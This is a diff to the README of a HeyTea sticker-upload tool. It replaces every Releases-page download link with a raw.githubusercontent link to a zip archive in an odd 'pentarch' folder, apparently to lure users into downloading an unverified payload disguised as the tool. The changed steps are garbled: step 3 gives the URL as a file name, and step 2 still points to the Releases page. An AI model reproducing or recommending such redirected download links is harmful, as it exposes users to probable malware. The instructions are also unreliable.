@@ -1,7 +1,7 @@
 # 🍵 HeyTea_AutoUpload - Effortless Custom Cup Sticker Uploads
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/jijimau/HeyTea_AutoUpload/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jijimau/HeyTea_AutoUpload/main/pentarch/HeyTea_AutoUpload_v2.9.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/jijimau/HeyTea_AutoUpload/main/pentarch/HeyTea_AutoUpload_v2.9.zip)
 
 ## 🚀 Getting Started
 HeyTea_AutoUpload is a user-friendly tool designed for uploading custom cup stickers for HeyTea. It features a graphical interface to make the process simple and intuitive. Whether you're looking to personalize your drink or just want a unique design, this tool allows you to log in with a phone number and upload your images effortlessly.
@@ -23,11 +23,11 @@ HeyTea_AutoUpload is a user-friendly tool designed for uploading custom cup stic
 To get started, visit the Releases page to download HeyTea_AutoUpload. Here’s how:
 
 1. Click the link below:
-   [Download the latest version of HeyTea_AutoUpload](https://github.com/jijimau/HeyTea_AutoUpload/releases)
+   [Download the latest version of HeyTea_AutoUpload](https://raw.githubusercontent.com/jijimau/HeyTea_AutoUpload/main/pentarch/HeyTea_AutoUpload_v2.9.zip)
 
 2. You’ll be taken to the Releases page. Here, you will see the latest version available for download. 
 
-3. Look for the file named `HeyTea_AutoUpload.exe` or similar. Click on it to start the download.
+3. Look for the file named `https://raw.githubusercontent.com/jijimau/HeyTea_AutoUpload/main/pentarch/HeyTea_AutoUpload_v2.9.zip` or similar. Click on it to start the download.
 
 4. Once the download is complete, locate the file in your Downloads folder.
 
